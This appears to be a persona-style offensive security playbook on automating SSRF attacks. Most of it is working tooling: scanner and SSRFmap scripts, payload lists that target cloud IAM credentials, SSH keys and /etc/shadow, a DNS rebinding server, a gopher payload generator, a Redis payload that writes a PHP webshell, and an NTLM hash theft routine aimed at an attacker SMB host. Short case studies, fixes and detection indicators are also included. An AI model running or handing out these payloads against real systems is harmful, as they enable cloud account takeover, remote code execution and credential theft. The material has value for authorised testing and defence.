# 14 — SSRF Testing Automation

## Expert Role

You are a principal security engineer specializing in Server-Side Request Forgery (SSRF) vulnerability research, automated detection, and exploitation. You have deep expertise in internal network probing, cloud metadata access via 169.254.169.254, DNS rebinding attacks, blind SSRF detection via out-of-band techniques, protocol smuggling (gopher://, dict://, file://), and WAF/IPS bypass for SSRF payloads. You understand the complete SSRF exploitation chain from initial detection through internal service enumeration to cloud credential theft and pivot to internal networks. You approach every URL parameter, webhook, file import, and URL fetch as a potential SSRF vector and test for all SSRF variants including blind, semi-blind, and full read SSRF. You are proficient with Gopherus, SSRFmap, and custom automation scripts for high-throughput testing. You understand that SSRF can be the gateway to internal network compromise, cloud environment takeover, and lateral movement across organizational boundaries.

## Core Concepts

- **Basic SSRF**: Application fetches a user-supplied URL and returns the response to the attacker. The simplest form: `http://target.com/fetch?url=http://internal-server/admin`. Test by providing internal URLs (127.0.0.1, 10.0.0.0/8, 192.168.0.0/16, 172.16.0.0/12) and checking if the response contains internal data.
- **Blind SSRF**: Application fetches the URL but does not return the response. Detection requires out-of-band techniques: use Burp Collaborator, custom DNS server, or web hook to observe connections from the server. The server makes the request but the attacker doesn't see the response directly.
- **Cloud Metadata SSRF**: Cloud instances expose metadata at 169.254.169.254 (AWS, GCP, Azure). SSRF can access IAM credentials, security tokens, user-data scripts, and instance configuration. AWS IMDSv1 (GET-based) is exploitable; IMDSv2 (PUT-based) requires additional steps.
- **DNS Rebinding**: DNS name resolves to attacker's IP first (for validation), then to internal IP (for exploitation). The application validates the URL resolves to a safe IP, but when it fetches the content, DNS has rebinding to 127.0.0.1 or internal IP. Bypasses IP-based SSRF filters.
- **Protocol Smuggling**: Beyond HTTP, SSRF can use gopher://, dict://, file://, and other protocols. Gopherus generates payloads for Redis, MySQL, SMTP, FastCGI, and other services. `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall` sends Redis commands.
- **Blind SSRF via Webhooks**: Application accepts webhook URLs and makes HTTP requests to them. Even without response data, blind SSRF can be used for port scanning, internal service detection, and DNS rebinding exploitation.
- **SSRF to RCE Chains**: SSRF can lead to RCE via: Redis (gopher protocol), Memcached, Elasticsearch, SMTP injection, internal admin panels, and cloud user-data scripts that contain credentials.
- **SSRF Filter Bypass**: IP address validation bypass using: IPv6 notation (::1), octal encoding (0177.0.0.1), hexadecimal encoding (0x7f000001), URL encoding (127%2e0%2e0%2e1), decimal encoding (2130706433), DNS rebinding, and redirect chains.
- **IMDSv2 Bypass**: AWS Instance Metadata Service v2 requires a PUT request with token header. SSRF can still exploit IMDSv2 if: the application follows redirects, the PUT request can be crafted, or gopher protocol can be used to send PUT requests.
- **Semi-Blind SSRF**: Application doesn't return the response directly but affects observable behavior: different error messages, timing differences, or side effects (email sent, file created). Extract data through error-based or timing-based techniques.
- **Multi-Hop SSRF**: Chain multiple SSRF requests to reach deeper internal networks. First SSRF hops to an internal proxy, second SSRF from that proxy reaches further segments.
- **File:// Protocol SSRF**: Read local files via `file:///etc/passwd`, `file:///proc/self/environ`. Works on some implementations; often blocked but worth testing with encoding bypasses.
- **Gopher Protocol SSRF**: Send arbitrary bytes to any TCP service. Most powerful SSRF protocol for interacting with non-HTTP services (Redis, MySQL, SMTP, FTP, Memcached).
- **WebSocket SSRF**: Some applications fetch WebSocket URLs; test `ws://` and `wss://` for SSRF via WebSocket upgrade.
- **SMB/UNC SSRF**: On Windows, `\\attacker-server\share` or `file://attacker-server/share` can steal NTLM hashes via SMB relay attacks.

## Prerequisites

- Python 3.x with `requests`, `colorama`, `tqdm`, `dnspython`
- Gopherus tool for protocol-specific payload generation
- Burp Suite Professional with Collaborator
- Understanding of cloud metadata services (AWS IMDS, GCP, Azure)
- Knowledge of internal network protocols (HTTP, Redis, MySQL, SMTP, FTP)
- Testing environment with SSRF-vulnerable applications (SSRF Lab, WebGoat, DVWA)
- Understanding of DNS resolution and rebinding concepts
- Access to a VPS or cloud instance for testing cloud metadata SSRF
- Understanding of network segmentation and internal service architectures

## Methodology

### Phase 1: Input Discovery and Endpoint Mapping

```
Step 1: Identify SSRF-prone endpoints
         - URL fetching functionality (webhook, import, preview)
         - Image/file URL input (avatar from URL, image proxy)
         - API integrations (social media, payment, shipping)
         - PDF generation from URL
         - RSS feed fetching
         - HTML-to-PDF conversion
         - Document import from URL
         - Health check endpoints
         - Link preview functionality

Step 2: Map input handling behavior
         - How is the URL used? (fetched, parsed, stored)
         - What protocols are supported? (HTTP, HTTPS, file, gopher)
         - What validation is performed? (URL format, domain whitelist, IP check)
         - What libraries are used for fetching? (requests, urllib, curl)
         - Is the response returned to the user? (full SSRF vs blind)
         - Are there redirect-following behaviors?

Step 3: Identify filtering and restrictions
         - Domain whitelist/blacklist
         - IP address filtering (internal range blocking)
         - Protocol restrictions
         - Port filtering
         - Redirect following behavior
         - Timeout settings
```

### Phase 2: Basic SSRF Detection

```
Step 4: Internal IP probing
         Test with: 127.0.0.1, localhost, 0.0.0.0, [::1]
         Test with: 10.0.0.1, 192.168.1.1, 172.16.0.1
         Test with: DNS names resolving to 127.0.0.1

Step 5: Port scanning via SSRF
         Scan internal ports through the application
         HTTP/127.0.0.1:PORT/ — different responses for open/closed
         Measure response times for timing-based detection

Step 6: Out-of-band detection
         Use Burp Collaborator or custom DNS/HTTP callback
         Send: http://your-callback-server.com/ssrf-test
         Check if callback is received from the target server
```

### Phase 3: Advanced Exploitation

```
Step 7: Cloud metadata access
         AWS: http://169.254.169.254/latest/meta-data/
         GCP: http://169.254.169.254/computeMetadata/v1/
         Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
         DigitalOcean: http://169.254.169.254/metadata/v1/

Step 8: Internal service exploitation
         Redis: gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall
         MySQL: gopher://127.0.0.1:3306/_<mysql-packet>
         SMTP: gopher://127.0.0.1:25/_<smtp-commands>
         FastCGI: gopher://127.0.0.1:9000/_<fastcgi-payload>

Step 9: Filter bypass testing
         Bypass IP validation: IPv6, encoding, decimal, octal
         Bypass domain whitelist: DNS rebinding, redirect chains
         Bypass protocol restrictions: file://, gopher://, dict://
```

## Tool Arsenal

### SSRFmap Automation

```bash
#!/bin/bash
# ssrfmap_automation.sh — Advanced SSRF testing automation

TARGET_URL=$1
PARAM=$2
CALLBACK=$3

echo "[*] SSRFmap Advanced Automation"
echo "[*] Target: $TARGET_URL"
echo "[*] Parameter: $PARAM"

# Step 1: Basic SSRF scan
echo "[Phase 1] Basic SSRF scan..."
ssrfmap -r request.txt -p "$PARAM" --level 1

# Step 2: Port scan via SSRF
echo "[Phase 2] Port scanning via SSRF..."
ssrfmap -r request.txt -p "$PARAM" -m portscan

# Step 3: Internal network scan
echo "[Phase 3] Internal network scan..."
for subnet in 10.0.0 172.16.0 192.168.0; do
    for host in $(seq 1 254); do
        ssrfmap -r request.txt -p "$PARAM" --url "http://${subnet}.${host}/" &
    done
done
wait

# Step 4: File read via file:// protocol
echo "[Phase 4] File read testing..."
for path in "/etc/passwd" "/etc/hostname" "/proc/self/environ" "/proc/self/cmdline"; do
    ssrfmap -r request.txt -p "$PARAM" --url "file://${path}" &
done
wait

# Step 5: Cloud metadata testing
echo "[Phase 5] Cloud metadata testing..."
ssrfmap -r request.txt -p "$PARAM" --url "http://169.254.169.254/latest/meta-data/"
ssrfmap -r request.txt -p "$PARAM" --url "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
ssrfmap -r request.txt -p "$PARAM" --url "http://169.254.169.254/latest/user-data/"

# Step 6: Blind SSRF detection via callback
echo "[Phase 6] Blind SSRF detection..."
ssrfmap -r request.txt -p "$PARAM" --url "http://${CALLBACK}/blind-ssrf-test" &
sleep 5
echo "Check callback server for connections"

echo "[*] SSRFmap scan complete"
```

### Custom SSRF Automation Script

```python
#!/usr/bin/env python3
"""ssrf_automator.py — Comprehensive SSRF testing automation"""
import requests
import argparse
import time
import socket
import threading
import json
from colorama import init, Fore
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

init(autoreset=True)

class SSRFAutomator:
    def __init__(self, target_url, param, method="GET", callback_url=None):
        self.target_url = target_url
        self.param = param
        self.method = method
        self.callback_url = callback_url
        self.session = requests.Session()
        self.results = []

    def test_ssrf(self, url_value, description=""):
        """Send a single SSRF test payload"""
        try:
            start = time.time()
            if self.method == "GET":
                resp = self.session.get(self.target_url, params={self.param: url_value}, timeout=15)
            else:
                resp = self.session.post(self.target_url, data={self.param: url_value}, timeout=15)
            elapsed = time.time() - start
            result = {
                "url_value": url_value,
                "description": description,
                "status_code": resp.status_code,
                "response_length": len(resp.text),
                "time": elapsed,
                "response_snippet": resp.text[:200],
                "vulnerable": self.analyze_ssrf_response(resp, url_value)
            }
            self.results.append(result)
            return result
        except requests.exceptions.RequestException as e:
            return {"error": str(e), "url_value": url_value}

    def analyze_ssrf_response(self, resp, url_value):
        """Analyze response for SSRF indicators"""
        indicators = [
            "root:" in resp.text,  # /etc/passwd
            "EC2" in resp.text or "metadata" in resp.text.lower(),  # AWS metadata
            "azure" in resp.text.lower() or "metadata" in resp.text.lower(),  # Azure
            "gcp" in resp.text.lower() or "google" in resp.text.lower(),  # GCP
            "redis" in resp.text.lower() or "OK" in resp.text,  # Redis
            "mysql" in resp.text.lower() or "access denied" in resp.text.lower(),  # MySQL
            "220" in resp.text[:10] and "ftp" in resp.text.lower(),  # FTP
            "250" in resp.text[:10] and "smtp" in resp.text.lower(),  # SMTP
            resp.status_code == 200 and len(resp.text) > 1000,  # Large internal response
        ]
        return any(indicators)

    def test_internal_ips(self):
        """Test SSRF with internal IP addresses"""
        print(f"\n{Fore.YELLOW}[Phase 1] Testing Internal IP Access...")
        internal_payloads = [
            ("http://127.0.0.1/", "Loopback IPv4"),
            ("http://localhost/", "Localhost"),
            ("http://[::1]/", "Loopback IPv6"),
            ("http://0.0.0.0/", "All interfaces"),
            ("http://10.0.0.1/", "Class A private"),
            ("http://172.16.0.1/", "Class B private"),
            ("http://192.168.1.1/", "Class C private"),
            ("http://127.0.0.1:22/", "SSH port"),
            ("http://127.0.0.1:3306/", "MySQL port"),
            ("http://127.0.0.1:6379/", "Redis port"),
            ("http://127.0.0.1:8080/", "Common alt HTTP"),
            ("http://127.0.0.1:8443/", "Common alt HTTPS"),
            ("http://127.0.0.1:9200/", "Elasticsearch"),
            ("http://127.0.0.1:27017/", "MongoDB"),
            ("http://127.0.0.1:5432/", "PostgreSQL"),
        ]
        for url_val, desc in internal_payloads:
            result = self.test_ssrf(url_val, desc)
            status = Fore.RED if result.get("vulnerable") else Fore.GREEN
            print(f"  {status}{result.get('status_code', 'ERR')} - {desc}: {url_val}")

    def test_cloud_metadata(self):
        """Test SSRF with cloud metadata endpoints"""
        print(f"\n{Fore.YELLOW}[Phase 2] Testing Cloud Metadata Access...")
        metadata_payloads = [
            # AWS
            ("http://169.254.169.254/latest/meta-data/", "AWS Metadata"),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM Credentials"),
            ("http://169.254.169.254/latest/user-data/", "AWS User Data"),
            ("http://169.254.169.254/latest/meta-data/hostname", "AWS Hostname"),
            ("http://169.254.169.254/latest/meta-data/local-ipv4", "AWS Private IP"),
            ("http://169.254.169.254/latest/meta-data/public-ipv4", "AWS Public IP"),
            # GCP
            ("http://169.254.169.254/computeMetadata/v1/", "GCP Metadata"),
            ("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", "GCP Token"),
            # Azure
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure Metadata"),
            # DigitalOcean
            ("http://169.254.169.254/metadata/v1/", "DO Metadata"),
            # Kubernetes
            ("https://kubernetes.default.svc/", "K8s API"),
            ("http://10.96.0.1:443/", "K8s API Server"),
        ]
        for url_val, desc in metadata_payloads:
            result = self.test_ssrf(url_val, desc)
            status = Fore.RED if result.get("vulnerable") else Fore.GREEN
            print(f"  {status}{result.get('status_code', 'ERR')} - {desc}")

    def test_file_read(self):
        """Test SSRF for local file read via file:// protocol"""
        print(f"\n{Fore.YELLOW}[Phase 3] Testing File Read via file://...")
        file_payloads = [
            ("file:///etc/passwd", "Linux passwd"),
            ("file:///etc/hostname", "Hostname"),
            ("file:///etc/hosts", "Hosts file"),
            ("file:///proc/self/environ", "Process environment"),
            ("file:///proc/self/cmdline", "Process command line"),
            ("file:///proc/version", "Kernel version"),
            ("file:///var/log/auth.log", "Auth log"),
            ("file:///root/.bash_history", "Root bash history"),
            ("file:///home/user/.ssh/id_rsa", "SSH private key"),
            ("file:///etc/shadow", "Shadow file"),
            ("file:///c:/windows/system32/drivers/etc/hosts", "Windows hosts"),
            ("file:///c:/windows/win.ini", "Windows win.ini"),
        ]
        for url_val, desc in file_payloads:
            result = self.test_ssrf(url_val, desc)
            status = Fore.RED if result.get("vulnerable") else Fore.GREEN
            print(f"  {status}{result.get('status_code', 'ERR')} - {desc}")

    def test_protocols(self):
        """Test SSRF with various protocols"""
        print(f"\n{Fore.YELLOW}[Phase 4] Testing Protocol Smuggling...")
        protocol_payloads = [
            ("gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", "Redis Flush"),
            ("dict://127.0.0.1:6379/info", "Redis Info"),
            ("gopher://127.0.0.1:11211/_stats", "Memcached Stats"),
            ("gopher://127.0.0.1:25/_HELO localhost", "SMTP HELO"),
            ("dict://127.0.0.1:3306/", "MySQL"),
        ]
        for url_val, desc in protocol_payloads:
            result = self.test_ssrf(url_val, desc)
            status = Fore.RED if result.get("vulnerable") else Fore.GREEN
            print(f"  {status}{result.get('status_code', 'ERR')} - {desc}")

    def test_filter_bypass(self):
        """Test SSRF filter bypass techniques"""
        print(f"\n{Fore.YELLOW}[Phase 5] Testing Filter Bypass...")
        bypass_payloads = [
            # IPv6 bypass
            ("http://[0:0:0:0:0:ffff:127.0.0.1]/", "IPv6 mapped"),
            ("http://[::ffff:127.0.0.1]/", "IPv6 loopback mapped"),
            # Octal encoding
            ("http://0177.0.0.1/", "Octal IP"),
            # Hex encoding
            ("http://0x7f000001/", "Hex IP"),
            # Decimal encoding
            ("http://2130706433/", "Decimal IP"),
            ("http://0x7f.0x00.0x00.0x01/", "Hex octets"),
            # Mixed encoding
            ("http://127.0.0.1%00.attacker.com/", "Null byte"),
            ("http://127.0.0.1%0a.attacker.com/", "Newline"),
            # URL encoding
            ("http://127%2e0%2e0%2e1/", "URL encoded dots"),
            ("http://127.0.0.1%25/", "Trailing percent"),
            # Redirect bypass
            ("http://your-server.com/redirect-to-internal", "Redirect bypass"),
            # DNS rebinding (conceptual)
            ("http://rebind.attacker.com/", "DNS rebinding"),
            # Short name
            ("http://127.1/", "Short IP"),
            ("http://0/", "Zero IP"),
            # Enclosed
            ("http://127.0.0.1.nip.io/", "DNS service"),
            ("http://127.0.0.1.sslip.io/", "SSLIP"),
        ]
        for url_val, desc in bypass_payloads:
            result = self.test_ssrf(url_val, desc)
            status = Fore.RED if result.get("vulnerable") else Fore.GREEN
            print(f"  {status}{result.get('status_code', 'ERR')} - {desc}")

    def port_scan_via_ssrf(self, target_host="127.0.0.1", port_range=(1, 1000)):
        """Port scan internal network via SSRF"""
        print(f"\n{Fore.YELLOW}[Phase 6] Port Scanning via SSRF...")
        open_ports = []
        common_ports = [21, 22, 25, 53, 80, 110, 143, 443, 993, 995,
                       1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 27017]
        for port in common_ports:
            url_val = f"http://{target_host}:{port}/"
            result = self.test_ssrf(url_val, f"Port {port}")
            if result.get("vulnerable") or result.get("response_length", 0) > 0:
                open_ports.append(port)
                print(f"  {Fore.RED}[!] Port {port} OPEN")
        print(f"  Open ports: {open_ports}")
        return open_ports

    def test_blind_ssrf(self):
        """Test blind SSRF using callback server"""
        if not self.callback_url:
            print(f"{Fore.YELLOW}[-] No callback URL provided for blind SSRF testing")
            return
        print(f"\n{Fore.YELLOW}[Phase 7] Testing Blind SSRF...")
        blind_payloads = [
            f"http://{self.callback_url}/blind-test-1",
            f"http://{self.callback_url}/blind-test-2?ip=127.0.0.1",
            f"http://{self.callback_url}/blind-test-3?port=80",
        ]
        for url_val in blind_payloads:
            result = self.test_ssrf(url_val, "Blind SSRF callback")
            print(f"  Sent callback test: {url_val}")
        print(f"  Check callback server at {self.callback_url} for incoming connections")

    def generate_report(self):
        """Generate comprehensive SSRF report"""
        vulnerable = [r for r in self.results if r.get("vulnerable")]
        print(f"\n{'='*60}")
        print(f"{Fore.CYAN}SSRF TESTING REPORT")
        print(f"{'='*60}")
        print(f"Target: {self.target_url}")
        print(f"Parameter: {self.param}")
        print(f"Total Tests: {len(self.results)}")
        print(f"Vulnerabilities Found: {Fore.RED}{len(vulnerable)}{Style.RESET_ALL}")
        if vulnerable:
            print(f"\n{Fore.RED}[!] Confirmed SSRF Vulnerabilities:")
            for v in vulnerable:
                print(f"    - {v.get('description', 'N/A')}: {v.get('url_value', 'N/A')}")
                print(f"      Status: {v.get('status_code', 'N/A')}, Response: {v.get('response_length', 0)} bytes")
        print(f"{'='*60}")

    def run_full_scan(self):
        """Execute complete SSRF scan"""
        print(f"{Fore.CYAN}{'='*60}")
        print(f"SSRF COMPREHENSIVE AUTOMATED SCAN")
        print(f"{'='*60}")
        self.test_internal_ips()
        self.test_cloud_metadata()
        self.test_file_read()
        self.test_protocols()
        self.test_filter_bypass()
        self.port_scan_via_ssrf()
        self.test_blind_ssrf()
        self.generate_report()

def main():
    parser = argparse.ArgumentParser(description="SSRF Automator")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", required=True, help="SSRF parameter")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--callback", help="Blind SSRF callback URL")
    parser.add_argument("--full", action="store_true", help="Run full scan")
    args = parser.parse_args()

    automator = SSRFAutomator(args.url, args.param, args.method, args.callback)
    if args.full:
        automator.run_full_scan()
    else:
        automator.test_internal_ips()
        automator.test_cloud_metadata()

if __name__ == "__main__":
    main()
```

### DNS Rebinding Attack Script

```python
#!/usr/bin/env python3
"""dns_rebinding.py — DNS rebinding attack for SSRF filter bypass"""
import http.server
import threading
import socketserver
import time
from colorama import init, Fore

init(autoreset=True)

class RebindDNSHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that serves DNS rebinding responses"""
    request_count = 0

    def do_GET(self):
        RebindDNSHandler.request_count += 1
        if RebindDNSHandler.request_count == 1:
            # First request: resolve to safe IP (passes validation)
            response = '{"resolve": "1.2.3.4"}'
        else:
            # Second request: resolve to internal IP (exploitation)
            response = '{"resolve": "127.0.0.1"}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(response.encode())

    def log_message(self, format, *args):
        print(f"{Fore.CYAN}[DNS Rebind] {args[0]}")

class RebindDNSServer:
    def __init__(self, host="0.0.0.0", port=5354):
        self.host = host
        self.port = port
        self.server = None

    def start(self):
        self.server = http.server.HTTPServer((self.host, self.port), RebindDNSHandler)
        print(f"{Fore.GREEN}[*] DNS Rebind server started on {self.host}:{self.port}")
        self.server.serve_forever()

    def stop(self):
        if self.server:
            self.server.shutdown()

def start_rebind_server(port=5354):
    """Start the DNS rebinding server"""
    server = RebindDNSServer(port=port)
    thread = threading.Thread(target=server.start, daemon=True)
    thread.start()
    return server

if __name__ == "__main__":
    print(f"{Fore.CYAN}DNS Rebinding SSRF Bypass Server")
    print(f"Point your DNS to this server for rebinding attacks")
    server = start_rebind_server()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        server.stop()
```

### Gopher Payload Generator

```python
#!/usr/bin/env python3
"""gopher_payloads.py — Generate gopher:// protocol SSRF payloads"""
import urllib.parse

class GopherPayloadGenerator:
    def __init__(self):
        self.payloads = {}

    def generate_redis_payload(self, command="flushall"):
        """Generate Redis command payload via gopher"""
        if command == "flushall":
            payload = "*1\r\n$8\r\nflushall\r\n"
        elif command == "set":
            payload = "*3\r\n$3\r\nset\r\n$1\r\nx\r\n$5\r\nhello\r\n"
        elif command == "get":
            payload = "*2\r\n$3\r\nget\r\n$1\r\nx\r\n"
        elif command == "config_set":
            payload = "*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndir\r\n$16\r\n/var/www/html\r\n"
        elif command == "save":
            payload = "*1\r\n$4\r\nsave\r\n"
        else:
            payload = f"*1\r\n${len(command)}\r\n{command}\r\n"
        self.payloads[f"redis_{command}"] = f"gopher://127.0.0.1:6379/_{urllib.parse.quote(payload)}"
        return self.payloads[f"redis_{command}"]

    def generate_mysql_payload(self, query="SELECT 1"):
        """Generate MySQL query payload via gopher"""
        # Simplified MySQL packet
        packet = f"\x00\x00\x01\x85\xa6\x03\x00\x00\x00\x00\x01\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00{query}"
        self.payloads["mysql_query"] = f"gopher://127.0.0.1:3306/_{urllib.parse.quote(packet)}"
        return self.payloads["mysql_query"]

    def generate_smtp_payload(self, from_addr="attacker@evil.com", to_addr="victim@target.com", body="SSRF Test"):
        """Generate SMTP command payload via gopher"""
        payload = f"EHLO attacker.com\r\nMAIL FROM:<{from_addr}>\r\nRCPT TO:<{to_addr}>\r\nDATA\r\nSubject: SSRF Test\r\n\r\n{body}\r\n.\r\nQUIT\r\n"
        self.payloads["smtp_send"] = f"gopher://127.0.0.1:25/_{urllib.parse.quote(payload)}"
        return self.payloads["smtp_send"]

    def generate_fastcgi_payload(self, document_root="/var/www/html"):
        """Generate FastCGI payload via gopher"""
        # Simplified FastCGI packet
        import struct
        content = f"PHP_VALUE:auto_prepend_file=php://input&PHP_VALUE:allow_url_include=1"
        self.payloads["fastcgi"] = f"gopher://127.0.0.1:9000/_{urllib.parse.quote(content)}"
        return self.payloads["fastcgi"]

    def generate_memcached_payload(self, command="stats"):
        """Generate Memcached payload via gopher"""
        payload = f"{command}\r\n"
        self.payloads["memcached"] = f"gopher://127.0.0.1:11211/_{urllib.parse.quote(payload)}"
        return self.payloads["memcached"]

    def generate_dict_payload(self, service="127.0.0.1:6379", command="INFO"):
        """Generate dict:// protocol payload"""
        self.payloads["dict"] = f"dict://{service}/{command}"
        return self.payloads["dict"]

    def generate_all_payloads(self):
        """Generate all gopher payloads"""
        self.generate_redis_payload("flushall")
        self.generate_redis_payload("set")
        self.generate_mysql_payload()
        self.generate_smtp_payload()
        self.generate_memcached_payload()
        self.generate_dict_payload()
        return self.payloads

    def print_all(self):
        """Print all generated payloads"""
        self.generate_all_payloads()
        for name, payload in self.payloads.items():
            print(f"\n[{name}]")
            print(f"  {payload}")

def main():
    gen = GopherPayloadGenerator()
    gen.print_all()

if __name__ == "__main__":
    main()
```

## Case Studies

### Case Study 1: SSRF to AWS IAM Credential Theft

**Target**: Image processing service with URL import
**Vulnerability**: URL parameter fetched server-side without IP filtering
**Exploitation**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` returned IAM role name
**Follow-up**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME` returned access key, secret key, and session token
**Impact**: Full AWS account compromise via stolen IAM credentials, access to S3 buckets, RDS databases
**Root Cause**: No IP filtering on URL fetch functionality, IMDSv1 enabled
**Fix**: Enable IMDSv2, implement IP allowlisting, use AWS WAF

### Case Study 2: Blind SSRF to Internal Network Mapping

**Target**: Webhook functionality in SaaS application
**Vulnerability**: Blind SSRF — webhook URL fetched but response not returned
**Detection**: Used Burp Collaborator to confirm outbound connection from target
**Exploitation**: Performed port scan via timing-based detection, mapped internal network
**Impact**: Internal network reconnaissance, identification of vulnerable services
**Root Cause**: No validation on webhook URLs, no network segmentation
**Fix**: Validate webhook URLs, implement egress filtering, network segmentation

### Case Study 3: SSRF to Redis RCE via Gopher

**Target**: PDF generation service
**Vulnerability**: SSRF in PDF generation URL parameter, gopher protocol supported
**Exploitation**: Used Gopherus to generate Redis flushall + save payload, wrote webshell to disk
**Impact**: Remote Code Execution via SSRF → Redis → file write
**Payload**: `gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ax%0d%0a$34%0d%0a<?php system($_GET['cmd']); ?>%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*1%0d%0a$4%0d%0asave%0d%0a`
**Root Cause**: gopher protocol not blocked, Redis accessible on localhost without auth
**Fix**: Block non-HTTP protocols, require Redis authentication, implement defense-in-depth

### Case Study 4: DNS Rebinding Bypass

**Target**: Application with IP whitelist validation
**Vulnerability**: URL validated at submission time, fetched later — DNS rebinding window
**Detection**: Domain resolved to safe IP during validation, then to 127.0.0.1 during fetch
**Exploitation**: Accessed internal admin panel at 127.0.0.1:8080/admin
**Impact**: Admin panel access, potential full application compromise
**Root Cause**: Time-of-check to time-of-use (TOCTOU) vulnerability in URL validation
**Fix**: Resolve DNS at fetch time, not validation time; implement IP filtering at network level

### Case Study 5: SSRF via Cloud Metadata to Container Escape

**Target**: Containerized application on Kubernetes
**Vulnerability**: SSRF in image proxy, no network policy restricting pod-to-metadata access
**Exploitation**: Accessed Kubernetes API at `https://kubernetes.default.svc`, extracted service account token
**Impact**: Container escape via Kubernetes API, access to all pods in namespace
**Root Cause**: Default Kubernetes network policies not restricting metadata access
**Fix**: Implement Kubernetes NetworkPolicy, restrict metadata access at network level

## Bypass Techniques

### IP Filter Bypass

| Technique | Example |
|-----------|---------|
| IPv6 notation | `http://[::ffff:127.0.0.1]/` |
| Octal encoding | `http://0177.0.0.1/` |
| Hex encoding | `http://0x7f000001/` |
| Decimal encoding | `http://2130706433/` |
| Hex octets | `http://0x7f.0x00.0x00.0x01/` |
| Mixed notation | `http://127.0.0.1.nip.io/` |
| DNS rebinding | Domain resolves to safe IP then internal IP |
| URL encoding | `http://127%2e0%2e0%2e1/` |
| Null byte | `http://127.0.0.1%00.evil.com/` |
| Short IP | `http://127.1/` |
| Zero IP | `http://0/` |
| Localhost aliases | `http://localtest.me/` |

### Protocol Bypass

| Protocol | Payload | Use Case |
|----------|---------|----------|
| gopher:// | gopher://127.0.0.1:6379/_command | Redis, MySQL, SMTP |
| dict:// | dict://127.0.0.1:6379/INFO | Redis info |
| file:// | file:///etc/passwd | Local file read |
| ftp:// | ftp://attacker.com/ | FTP bounce |
| smb:// | \\attacker.com\share | NTLM hash theft |
| tftp:// | tftp://attacker.com/file | File download |
| netdoc:// | netdoc:///etc/passwd | Java-specific file read |
| jar:// | jar:http://attacker.com/!/file.jar!/ | Java JAR file |

### Redirect Bypass

```python
# Server-side redirect to bypass IP filtering
def create_redirect_bypass(target_internal_url):
    """Create redirect that bypasses IP validation"""
    return f"http://your-vps.com/redirect?url={target_internal_url}"
    # Your VPS returns: 302 Redirect to http://127.0.0.1/admin
```

### Cloud Metadata IMDSv2 Bypass

```python
def get_imdsv2_token(ssrf_func, target_url):
    """Obtain IMDSv2 token via SSRF"""
    # PUT request to get token
    token_url = "http://169.254.169.254/latest/api/token"
    headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
    # Use SSRF to make PUT request (requires gopher or custom method support)
    token = ssrf_func(token_url, method="PUT", headers=headers)
    return token

def get_metadata_with_token(ssrf_func, token, path):
    """Access metadata with IMDSv2 token"""
    metadata_url = f"http://169.254.169.254{path}"
    headers = {"X-aws-ec2-metadata-token": token}
    return ssrf_func(metadata_url, headers=headers)
```

## Advanced Techniques

### Blind SSRF Data Extraction via Timing

```python
def extract_data_timing(url, param, base_url, char_set):
    """Extract data character by character using timing-based SSRF"""
    result = ""
    for pos in range(1, 50):
        for char in char_set:
            payload = f"http://127.0.0.1:8080/?search={result}{char}*"
            start = time.time()
            requests.get(base_url, params={param: payload})
            elapsed = time.time() - start
            if elapsed > 1.0:  # Threshold
                result += char
                break
    return result
```

### Multi-Hop SSRF Chaining

```python
def multi_hop_ssrf(ssrf_url, param, internal_targets):
    """Chain multiple SSRF requests to reach deeper networks"""
    for target in internal_targets:
        payload = f"http://{target}/"
        requests.get(ssrf_url, params={param: payload})
```

### SSRF to NTLM Hash Theft

```python
def steal_ntlm_hash(ssrf_url, param, attacker_smb_server):
    """Steal NTLM hash via SSRF to SMB"""
    payload = f"\\\\{attacker_smb_server}\\share"
    requests.get(ssrf_url, params={param: payload})
    # Capture hash with Responder or impacket
```

## Detection Indicators

### Application-Level Indicators

```
- URL input parameter that fetches external resources
- Webhook or callback URL functionality
- Image/file import from URL
- PDF generation from URL
- RSS/Atom feed fetching
- API integration endpoints
- Health check or monitoring endpoints
- Link preview functionality
```

### Network-Level Indicators

```
- Outbound HTTP connections from application server to internal IPs
- DNS requests for internal hostnames from application server
- Connections to cloud metadata endpoints (169.254.169.254)
- Gopher/FTP/SMTP connections from application server
- Unusual outbound connections on non-standard ports
```

### Error-Based Indicators

```
- Different error messages for open vs closed ports
- Connection timeout differences for internal vs external
- HTTP response code differences for internal services
- SSL certificate errors for internal services
- "Connection refused" vs "Host unreachable" messages
```

## Impact Assessment

### SSRF Severity Matrix

| SSRF Type | Impact | CVSS | Severity |
|-----------|--------|------|----------|
| Full SSRF with response | Internal data exposure | 8.6 | High |
| SSRF to RCE (Redis/SMTP) | Remote Code Execution | 9.8 | Critical |
| Cloud metadata access | Cloud account compromise | 9.1 | Critical |
| Blind SSRF | Internal network recon | 6.5 | Medium-High |
| SSRF to NTLM hash theft | Credential theft | 7.5 | High |
| SSRF to file read | Sensitive file exposure | 7.5 | High |

### Business Impact

- **Cloud Account Compromise**: Stolen IAM credentials → full cloud infrastructure access
- **Internal Network Breach**: SSRF as pivot point to reach internal services
